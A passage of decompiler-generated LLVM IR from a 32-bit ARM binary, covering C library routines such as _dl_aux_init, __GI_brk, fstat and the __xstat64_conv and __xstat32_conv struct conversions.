.thread:                                          ; preds = %dec_label_pc_1a290, %dec_label_pc_1a244, %dec_label_pc_1a280, %dec_label_pc_1a26c, %dec_label_pc_1a1f8, %dec_label_pc_1a264, %bb
  %v0_1a2b0 = load i32, i32* @r5, align 4
  %v2_1a2b0 = add i32 %v0_1a2b0, 28
  %v3_1a2b0 = inttoptr i32 %v2_1a2b0 to i32*
  %v4_1a2b0 = load i32, i32* %v3_1a2b0, align 4
  store i32 %v4_1a2b0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1a2b0)
  br label %dec_label_pc_1a2bc

dec_label_pc_1a2bc:                               ; preds = %dec_label_pc_1a1e4, %.thread
  %v0_1a2bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1a1b0, i32* @r4, align 4
  store i32 %v6_1a1b0, i32* @r5, align 4
  store i32 %v9_1a1b0, i32* @r6, align 4
  store i32 %v12_1a1b0, i32* @lr, align 4
  ret i32 %v0_1a2bc

; uselistorder directives
  uselistorder i32 %v1_1a254, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_1a238, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 13, { 0, 3, 4, 6, 5, 1, 7, 2, 8 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a2bc, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_1a2d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1a2d0:
  %v0_1a2d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a2d0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1a2d0
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1a2d0, %bb
  %v10_1a2e0 = phi i32 [ %arg1, %dec_label_pc_1a2d0 ], [ 0, %bb ]
  ret i32 %v10_1a2e0

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r2.global-to-local, align 4
  %v4_1a2f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 108) to i32*), align 4
  %v4_1a2f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 72) to i32*), align 4
  store i32 %v4_1a2f8, i32* %r1.global-to-local, align 4
  %v1_1a2fc = add i32 %arg1, 44
  %v2_1a2fc = inttoptr i32 %v1_1a2fc to i32*
  %v3_1a2fc = load i32, i32* %v2_1a2fc, align 4
  %v1_1a300 = add i32 %arg1, 28
  %v2_1a300 = inttoptr i32 %v1_1a300 to i32*
  %v3_1a300 = load i32, i32* %v2_1a300, align 4
  store i32 %v3_1a300, i32* %r2.global-to-local, align 4
  %v2_1a304 = inttoptr i32 %v4_1a2f0 to i32*
  store i32 %v3_1a2fc, i32* %v2_1a304, align 4
  %v0_1a308 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a308 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a308 = inttoptr i32 %v1_1a308 to i32*
  store i32 %v0_1a308, i32* %v2_1a308, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_1a314(i32 %arg1) local_unnamed_addr {
dec_label_pc_1a314:
  %v0_1a314 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a314, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a314
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a314, %bb
  %v4_1a318 = phi i32 [ %arg1, %dec_label_pc_1a314 ], [ 0, %bb ]
  ret i32 %v4_1a318

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_1a358:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 26520) to i32*), align 4
  ret i32 0
}

define i32 @__aeabi_unwind_cpp_pr0() local_unnamed_addr {
entry:
  %v1_1a368 = load i32, i32* @r0, align 4
  ret i32 %v1_1a368
}

define i32 @__aeabi_unwind_cpp_pr1() local_unnamed_addr {
entry:
  %v1_1a36c = load i32, i32* @r0, align 4
  ret i32 %v1_1a36c
}

define i32 @__aeabi_unwind_cpp_pr2() local_unnamed_addr {
entry:
  %v1_1a370 = load i32, i32* @r0, align 4
  ret i32 %v1_1a370
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_1a37c = load i32, i32* @r1, align 4
  store i32 %v0_1a37c, i32* @r3, align 4
  %v0_1a38c = load i32, i32* @r0, align 4
  store i32 %v0_1a38c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a38c, -4095
  br i1 %tmp, label %dec_label_pc_1a3ac, label %dec_label_pc_1a398

dec_label_pc_1a398:                               ; preds = %entry
  %v0_1a398 = call i32 @__GI___errno_location()
  %v0_1a39c = load i32, i32* %r7.global-to-local, align 4
  %v1_1a39c = sub i32 0, %v0_1a39c
  store i32 %v1_1a39c, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1a3a4 = inttoptr i32 %v0_1a398 to i32*
  store i32 %v1_1a39c, i32* %v2_1a3a4, align 4
  br label %dec_label_pc_1a3bc

dec_label_pc_1a3ac:                               ; preds = %entry
  %v2_1a3ac = icmp eq i32 %v0_1a38c, 0
  br i1 %v2_1a3ac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a3ac
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a3ac, %bb
  call void @__pseudo_cond_branch(i1 %v2_1a3ac, i32 ptrtoint (i32* @global_var_1a544.1325 to i32))
  br label %dec_label_pc_1a3bc

dec_label_pc_1a3bc:                               ; preds = %dec_label_pc_1a398, %.thread
  %v0_1a3bc = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1a3bc

; uselistorder directives
  uselistorder i32 %v0_1a38c, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1a3bc, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1a3cc = load i32, i32* @r4, align 4
  store i32 %v3_1a3cc, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_1a3e4 = inttoptr i32 %arg2 to i8*
  %v3_1a3e4 = call i32 @__GI_memset(i8* %v2_1a3e4, i32 0)
  %v2_1a3e8 = load i32, i32* %arg1, align 4
  store i32 %v2_1a3e8, i32* %r3.global-to-local, align 4
  %v3_1a3e8 = add i32 %tmp, 4
  %v4_1a3e8 = inttoptr i32 %v3_1a3e8 to i32*
  %v5_1a3e8 = load i32, i32* %v4_1a3e8, align 4
  store i32 %v5_1a3e8, i32* %r4.global-to-local, align 4
  %v0_1a3ec = load i32, i32* %r5.global-to-local, align 4
  %v1_1a3ec = inttoptr i32 %v0_1a3ec to i32*
  store i32 %v2_1a3e8, i32* %v1_1a3ec, align 4
  %v3_1a3ec = add i32 %v0_1a3ec, 4
  %v4_1a3ec = inttoptr i32 %v3_1a3ec to i32*
  %v5_1a3ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a3ec, i32* %v4_1a3ec, align 4
  %v0_1a3f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1a3f0 = add i32 %v0_1a3f0, 12
  %v2_1a3f0 = inttoptr i32 %v1_1a3f0 to i32*
  %v3_1a3f0 = load i32, i32* %v2_1a3f0, align 4
  %v1_1a3f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a3f4 = add i32 %v1_1a3f4, 12
  %v3_1a3f4 = inttoptr i32 %v2_1a3f4 to i32*
  store i32 %v3_1a3f0, i32* %v3_1a3f4, align 4
  %v0_1a3f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1a3f8 = add i32 %v0_1a3f8, 96
  store i32 %v1_1a3f8, i32* %r3.global-to-local, align 4
  %v1_1a3fc = inttoptr i32 %v1_1a3f8 to i32*
  %v2_1a3fc = load i32, i32* %v1_1a3fc, align 4
  store i32 %v2_1a3fc, i32* %r3.global-to-local, align 4
  %v3_1a3fc = add i32 %v0_1a3f8, 100
  %v4_1a3fc = inttoptr i32 %v3_1a3fc to i32*
  %v5_1a3fc = load i32, i32* %v4_1a3fc, align 4
  store i32 %v5_1a3fc, i32* %r4.global-to-local, align 4
  %v1_1a400 = add i32 %v0_1a3f8, 56
  %v2_1a400 = inttoptr i32 %v1_1a400 to i32*
  %v3_1a400 = load i32, i32* %v2_1a400, align 4
  store i32 %v3_1a400, i32* %r2.global-to-local, align 4
  %v1_1a404 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a404 = add i32 %v1_1a404, 96
  %v3_1a404 = inttoptr i32 %v2_1a404 to i32*
  store i32 %v2_1a3fc, i32* %v3_1a404, align 4
  %v0_1a408 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a408 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a408 = add i32 %v1_1a408, 100
  %v3_1a408 = inttoptr i32 %v2_1a408 to i32*
  store i32 %v0_1a408, i32* %v3_1a408, align 4
  %v0_1a40c = load i32, i32* %r6.global-to-local, align 4
  %v1_1a40c = add i32 %v0_1a40c, 24
  store i32 %v1_1a40c, i32* %ip.global-to-local, align 4
  %v1_1a410 = inttoptr i32 %v1_1a40c to i32*
  %v2_1a410 = load i32, i32* %v1_1a410, align 4
  store i32 %v2_1a410, i32* %ip.global-to-local, align 4
  %v3_1a410 = add i32 %v0_1a40c, 28
  %v4_1a410 = inttoptr i32 %v3_1a410 to i32*
  %v5_1a410 = load i32, i32* %v4_1a410, align 4
  store i32 %v5_1a410, i32* %lr.global-to-local, align 4
  %v0_1a414 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a414 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a414 = add i32 %v1_1a414, 56
  %v3_1a414 = inttoptr i32 %v2_1a414 to i32*
  store i32 %v0_1a414, i32* %v3_1a414, align 4
  %v0_1a418 = load i32, i32* %r6.global-to-local, align 4
  %v1_1a418 = add i32 %v0_1a418, 72
  store i32 %v1_1a418, i32* %r3.global-to-local, align 4
  %v1_1a41c = add i32 %v0_1a418, 32
  store i32 %v1_1a41c, i32* %r7.global-to-local, align 4
  %v1_1a420 = inttoptr i32 %v1_1a41c to i32*
  %v2_1a420 = load i32, i32* %v1_1a420, align 4
  store i32 %v2_1a420, i32* %r7.global-to-local, align 4
  %v3_1a420 = add i32 %v0_1a418, 36
  %v4_1a420 = inttoptr i32 %v3_1a420 to i32*
  %v5_1a420 = load i32, i32* %v4_1a420, align 4
  store i32 %v5_1a420, i32* %r8.global-to-local, align 4
  %v1_1a424 = inttoptr i32 %v1_1a418 to i32*
  %v2_1a424 = load i32, i32* %v1_1a424, align 4
  %v3_1a424 = add i32 %v0_1a418, 76
  %v4_1a424 = inttoptr i32 %v3_1a424 to i32*
  %v5_1a424 = load i32, i32* %v4_1a424, align 4
  store i32 %v5_1a424, i32* %r1.global-to-local, align 4
  %v0_1a428 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a428 = add i32 %v0_1a428, 72
  %v1_1a42c = inttoptr i32 %v1_1a428 to i32*
  store i32 %v2_1a424, i32* %v1_1a42c, align 4
  %v3_1a42c = add i32 %v0_1a428, 76
  %v4_1a42c = inttoptr i32 %v3_1a42c to i32*
  %v5_1a42c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a42c, i32* %v4_1a42c, align 4
  %v0_1a430 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a430 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a430 = add i32 %v1_1a430, 32
  %v3_1a430 = inttoptr i32 %v2_1a430 to i32*
  store i32 %v0_1a430, i32* %v3_1a430, align 4
  %v0_1a434 = load i32, i32* %r8.global-to-local, align 4
  %v1_1a434 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a434 = add i32 %v1_1a434, 36
  %v3_1a434 = inttoptr i32 %v2_1a434 to i32*
  store i32 %v0_1a434, i32* %v3_1a434, align 4
  %v0_1a438 = load i32, i32* %r6.global-to-local, align 4
  %v1_1a438 = add i32 %v0_1a438, 80
  store i32 %v1_1a438, i32* %r3.global-to-local, align 4
  %v1_1a43c = add i32 %v0_1a438, 48
  store i32 %v1_1a43c, i32* %r7.global-to-local, align 4
  %v1_1a440 = inttoptr i32 %v1_1a43c to i32*
  %v2_1a440 = load i32, i32* %v1_1a440, align 4
  store i32 %v2_1a440, i32* %r7.global-to-local, align 4
  %v3_1a440 = add i32 %v0_1a438, 52
  %v4_1a440 = inttoptr i32 %v3_1a440 to i32*
  %v5_1a440 = load i32, i32* %v4_1a440, align 4
  store i32 %v5_1a440, i32* %r8.global-to-local, align 4
  %v1_1a444 = inttoptr i32 %v1_1a438 to i32*
  %v2_1a444 = load i32, i32* %v1_1a444, align 4
  %v3_1a444 = add i32 %v0_1a438, 84
  %v4_1a444 = inttoptr i32 %v3_1a444 to i32*
  %v5_1a444 = load i32, i32* %v4_1a444, align 4
  store i32 %v5_1a444, i32* %r1.global-to-local, align 4
  %v1_1a448 = add i32 %v0_1a438, 16
  %v2_1a448 = inttoptr i32 %v1_1a448 to i32*
  %v3_1a448 = load i32, i32* %v2_1a448, align 4
  store i32 %v3_1a448, i32* %r2.global-to-local, align 4
  %v0_1a44c = load i32, i32* %r5.global-to-local, align 4
  %v1_1a44c = add i32 %v0_1a44c, 80
  %v1_1a450 = inttoptr i32 %v1_1a44c to i32*
  store i32 %v2_1a444, i32* %v1_1a450, align 4
  %v3_1a450 = add i32 %v0_1a44c, 84
  %v4_1a450 = inttoptr i32 %v3_1a450 to i32*
  %v5_1a450 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a450, i32* %v4_1a450, align 4
  %v0_1a454 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a454 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a454 = add i32 %v1_1a454, 48
  %v3_1a454 = inttoptr i32 %v2_1a454 to i32*
  store i32 %v0_1a454, i32* %v3_1a454, align 4
  %v0_1a458 = load i32, i32* %r8.global-to-local, align 4
  %v1_1a458 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a458 = add i32 %v1_1a458, 52
  %v3_1a458 = inttoptr i32 %v2_1a458 to i32*
  store i32 %v0_1a458, i32* %v3_1a458, align 4
  %v0_1a45c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a45c = load i32, i32* %r5.global-to-local, align 4
  %v2_1a45c = add i32 %v1_1a45c, 16
  %v3_1a45c = inttoptr i32 %v2_1a45c to i32*
  store i32 %v0_1a45c, i32* %v3_1a45c, align 4
  %v0_1a460 = load i32, i32* %r6.global-to-local, align 4
  %v1_1a460 = add i32 %v0_1a460, 88
  store i32 %v1_1a460, i32* %r3.global-to-local, align 4
  %v1_1a464 = add i32 %v0_1a460, 20
  %v2_1a464 = inttoptr i32 %v1_1a464 to i32*
  %v3_1a464 = load i32, i32* %v2_1a464, align 4
  store i32 %v3_1a464, i32* %r2.global-to-local, align 4
  %v1_1a468 = inttoptr i32 %v1_1a460 to i32*
  %v2_1a468 = load i32, i32* %v1_1a468, align 4
  %v3_1a468 = add i32 %v0_1a460, 92
  %v4_1a468 = inttoptr i32 %v3_1a468 to i32*
  %v5_1a468 = load i32, i32* %v4_1a468, align 4
  store i32 %v5_1a468, i32* %r1.global-to-local, align 4
  %v1_1a46c = add i32 %v0_1a460, 64
  store i32 %v1_1a46c, i32* %r6.global-to-local, align 4
  %v1_1a470 = inttoptr i32 %v1_1a46c to i32*
  %v2_1a470 = load i32, i32* %v1_1a470, align 4
  store i32 %v2_1a470, i32* %r6.global-to-local, align 4
  %v3_1a470 = add i32 %v0_1a460, 68
  %v4_1a470 = inttoptr i32 %v3_1a470 to i32*
  %v5_1a470 = load i32, i32* %v4_1a470, align 4
  store i32 %v5_1a470, i32* %r7.global-to-local, align 4
  %v0_1a474 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a474 = add i32 %v0_1a474, 88
  store i32 %v1_1a474, i32* %r3.global-to-local, align 4
  %v2_1a478 = add i32 %v0_1a474, 20
  %v3_1a478 = inttoptr i32 %v2_1a478 to i32*
  store i32 %v3_1a464, i32* %v3_1a478, align 4
  %v0_1a47c = load i32, i32* %ip.global-to-local, align 4
  %v1_1a47c = load i32, i32* %r5.global-to-local, align 4
  %v2_1a47c = add i32 %v1_1a47c, 24
  %v3_1a47c = inttoptr i32 %v2_1a47c to i32*
  store i32 %v0_1a47c, i32* %v3_1a47c, align 4
  %v0_1a480 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a480 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a480 = add i32 %v1_1a480, 28
  %v3_1a480 = inttoptr i32 %v2_1a480 to i32*
  store i32 %v0_1a480, i32* %v3_1a480, align 4
  %v0_1a484 = load i32, i32* %r6.global-to-local, align 4
  %v1_1a484 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a484 = add i32 %v1_1a484, 64
  %v3_1a484 = inttoptr i32 %v2_1a484 to i32*
  store i32 %v0_1a484, i32* %v3_1a484, align 4
  %v0_1a488 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a488 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a488 = add i32 %v1_1a488, 68
  %v3_1a488 = inttoptr i32 %v2_1a488 to i32*
  store i32 %v0_1a488, i32* %v3_1a488, align 4
  %v0_1a48c = load i32, i32* %r3.global-to-local, align 4
  %v1_1a48c = inttoptr i32 %v0_1a48c to i32*
  store i32 %v2_1a468, i32* %v1_1a48c, align 4
  %v3_1a48c = add i32 %v0_1a48c, 4
  %v4_1a48c = inttoptr i32 %v3_1a48c to i32*
  %v5_1a48c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a48c, i32* %v4_1a48c, align 4
  %v2_1a490 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1a490, i32* %r4.global-to-local, align 4
  ret i32 %v2_1a468

; uselistorder directives
  uselistorder i32 %v0_1a460, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1a438, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 104, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1a498 = load i32, i32* @r4, align 4
  store i32 %v3_1a498, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_1a4b0 = inttoptr i32 %arg2 to i8*
  %v3_1a4b0 = call i32 @__GI_memset(i8* %v2_1a4b0, i32 0)
  %v2_1a4b4 = load i32, i32* %arg1, align 4
  %v3_1a4b4 = add i32 %tmp, 4
  %v4_1a4b4 = inttoptr i32 %v3_1a4b4 to i32*
  %v5_1a4b4 = load i32, i32* %v4_1a4b4, align 4
  store i32 %v5_1a4b4, i32* %r4.global-to-local, align 4
  %v0_1a4b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1a4b8 = inttoptr i32 %v0_1a4b8 to i32*
  store i32 %v2_1a4b4, i32* %v1_1a4b8, align 4
  %v3_1a4b8 = add i32 %v0_1a4b8, 4
  %v4_1a4b8 = inttoptr i32 %v3_1a4b8 to i32*
  %v5_1a4b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a4b8, i32* %v4_1a4b8, align 4
  %v0_1a4bc = load i32, i32* %r5.global-to-local, align 4
  %v1_1a4bc = add i32 %v0_1a4bc, 32
  %v1_1a4c0 = inttoptr i32 %v1_1a4bc to i32*
  %v2_1a4c0 = load i32, i32* %v1_1a4c0, align 4
  %v3_1a4c0 = add i32 %v0_1a4bc, 36
  %v4_1a4c0 = inttoptr i32 %v3_1a4c0 to i32*
  %v5_1a4c0 = load i32, i32* %v4_1a4c0, align 4
  store i32 %v5_1a4c0, i32* %r4.global-to-local, align 4
  %v1_1a4c4 = add i32 %v0_1a4bc, 96
  %v2_1a4c4 = inttoptr i32 %v1_1a4c4 to i32*
  %v3_1a4c4 = load i32, i32* %v2_1a4c4, align 4
  store i32 %v3_1a4c4, i32* %r2.global-to-local, align 4
  %v1_1a4c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a4c8 = add i32 %v1_1a4c8, 32
  %v3_1a4c8 = inttoptr i32 %v2_1a4c8 to i32*
  store i32 %v2_1a4c0, i32* %v3_1a4c8, align 4
  %v0_1a4cc = load i32, i32* %r4.global-to-local, align 4
  %v1_1a4cc = load i32, i32* %r6.global-to-local, align 4
  %v2_1a4cc = add i32 %v1_1a4cc, 36
  %v3_1a4cc = inttoptr i32 %v2_1a4cc to i32*
  store i32 %v0_1a4cc, i32* %v3_1a4cc, align 4
  %v0_1a4d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a4d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a4d0 = add i32 %v1_1a4d0, 12
  %v3_1a4d0 = inttoptr i32 %v2_1a4d0 to i32*
  store i32 %v0_1a4d0, i32* %v3_1a4d0, align 4
  %v0_1a4d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a4d4 = add i32 %v0_1a4d4, 48
  %v2_1a4d4 = inttoptr i32 %v1_1a4d4 to i32*
  %v3_1a4d4 = load i32, i32* %v2_1a4d4, align 4
  %v1_1a4d8 = add i32 %v0_1a4d4, 24
  store i32 %v1_1a4d8, i32* %ip.global-to-local, align 4
  %v1_1a4dc = inttoptr i32 %v1_1a4d8 to i32*
  %v2_1a4dc = load i32, i32* %v1_1a4dc, align 4
  store i32 %v2_1a4dc, i32* %ip.global-to-local, align 4
  %v3_1a4dc = add i32 %v0_1a4d4, 28
  %v4_1a4dc = inttoptr i32 %v3_1a4dc to i32*
  %v5_1a4dc = load i32, i32* %v4_1a4dc, align 4
  store i32 %v5_1a4dc, i32* %lr.global-to-local, align 4
  %v1_1a4e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a4e0 = add i32 %v1_1a4e0, 44
  %v3_1a4e0 = inttoptr i32 %v2_1a4e0 to i32*
  store i32 %v3_1a4d4, i32* %v3_1a4e0, align 4
  %v0_1a4e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a4e4 = add i32 %v0_1a4e4, 64
  %v2_1a4e4 = inttoptr i32 %v1_1a4e4 to i32*
  %v3_1a4e4 = load i32, i32* %v2_1a4e4, align 4
  %v1_1a4e8 = add i32 %v0_1a4e4, 56
  %v2_1a4e8 = inttoptr i32 %v1_1a4e8 to i32*
  %v3_1a4e8 = load i32, i32* %v2_1a4e8, align 4
  store i32 %v3_1a4e8, i32* %r2.global-to-local, align 4
  %v1_1a4ec = load i32, i32* %r6.global-to-local, align 4
  %v2_1a4ec = add i32 %v1_1a4ec, 52
  %v3_1a4ec = inttoptr i32 %v2_1a4ec to i32*
  store i32 %v3_1a4e4, i32* %v3_1a4ec, align 4
  %v0_1a4f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a4f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a4f0 = add i32 %v1_1a4f0, 48
  %v3_1a4f0 = inttoptr i32 %v2_1a4f0 to i32*
  store i32 %v0_1a4f0, i32* %v3_1a4f0, align 4
  %v0_1a4f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a4f4 = add i32 %v0_1a4f4, 72
  %v1_1a4f8 = inttoptr i32 %v1_1a4f4 to i32*
  %v2_1a4f8 = load i32, i32* %v1_1a4f8, align 4
  %v3_1a4f8 = add i32 %v0_1a4f4, 76
  %v4_1a4f8 = inttoptr i32 %v3_1a4f8 to i32*
  %v5_1a4f8 = load i32, i32* %v4_1a4f8, align 4
  store i32 %v5_1a4f8, i32* %r1.global-to-local, align 4
  %v0_1a4fc = load i32, i32* %r6.global-to-local, align 4
  %v1_1a4fc = add i32 %v0_1a4fc, 56
  %v1_1a500 = inttoptr i32 %v1_1a4fc to i32*
  store i32 %v2_1a4f8, i32* %v1_1a500, align 4
  %v3_1a500 = add i32 %v0_1a4fc, 60
  %v4_1a500 = inttoptr i32 %v3_1a500 to i32*
  %v5_1a500 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a500, i32* %v4_1a500, align 4
  %v0_1a504 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a504 = add i32 %v0_1a504, 80
  %v1_1a508 = inttoptr i32 %v1_1a504 to i32*
  %v2_1a508 = load i32, i32* %v1_1a508, align 4
  %v3_1a508 = add i32 %v0_1a504, 84
  %v4_1a508 = inttoptr i32 %v3_1a508 to i32*
  %v5_1a508 = load i32, i32* %v4_1a508, align 4
  store i32 %v5_1a508, i32* %r1.global-to-local, align 4
  %v0_1a50c = load i32, i32* %r6.global-to-local, align 4
  %v1_1a50c = add i32 %v0_1a50c, 64
  %v1_1a510 = inttoptr i32 %v1_1a50c to i32*
  store i32 %v2_1a508, i32* %v1_1a510, align 4
  %v3_1a510 = add i32 %v0_1a50c, 68
  %v4_1a510 = inttoptr i32 %v3_1a510 to i32*
  %v5_1a510 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a510, i32* %v4_1a510, align 4
  %v0_1a514 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a514 = add i32 %v0_1a514, 16
  %v2_1a514 = inttoptr i32 %v1_1a514 to i32*
  %v3_1a514 = load i32, i32* %v2_1a514, align 4
  %v1_1a518 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a518 = add i32 %v1_1a518, 16
  %v3_1a518 = inttoptr i32 %v2_1a518 to i32*
  store i32 %v3_1a514, i32* %v3_1a518, align 4
  %v0_1a51c = load i32, i32* %r5.global-to-local, align 4
  %v1_1a51c = add i32 %v0_1a51c, 88
  %v1_1a520 = add i32 %v0_1a51c, 20
  %v2_1a520 = inttoptr i32 %v1_1a520 to i32*
  %v3_1a520 = load i32, i32* %v2_1a520, align 4
  store i32 %v3_1a520, i32* %r2.global-to-local, align 4
  %v1_1a524 = inttoptr i32 %v1_1a51c to i32*
  %v2_1a524 = load i32, i32* %v1_1a524, align 4
  %v3_1a524 = add i32 %v0_1a51c, 92
  %v4_1a524 = inttoptr i32 %v3_1a524 to i32*
  %v5_1a524 = load i32, i32* %v4_1a524, align 4
  store i32 %v5_1a524, i32* %r1.global-to-local, align 4
  %v0_1a528 = load i32, i32* %r6.global-to-local, align 4
  %v1_1a528 = add i32 %v0_1a528, 72
  %v1_1a52c = inttoptr i32 %v1_1a528 to i32*
  store i32 %v2_1a524, i32* %v1_1a52c, align 4
  %v3_1a52c = add i32 %v0_1a528, 76
  %v4_1a52c = inttoptr i32 %v3_1a52c to i32*
  %v5_1a52c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a52c, i32* %v4_1a52c, align 4
  %v0_1a530 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a530 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a530 = add i32 %v1_1a530, 20
  %v3_1a530 = inttoptr i32 %v2_1a530 to i32*
  store i32 %v0_1a530, i32* %v3_1a530, align 4
  %v0_1a534 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a534 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a534 = add i32 %v1_1a534, 24
  %v3_1a534 = inttoptr i32 %v2_1a534 to i32*
  store i32 %v0_1a534, i32* %v3_1a534, align 4
  %v0_1a538 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a538 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a538 = add i32 %v1_1a538, 28
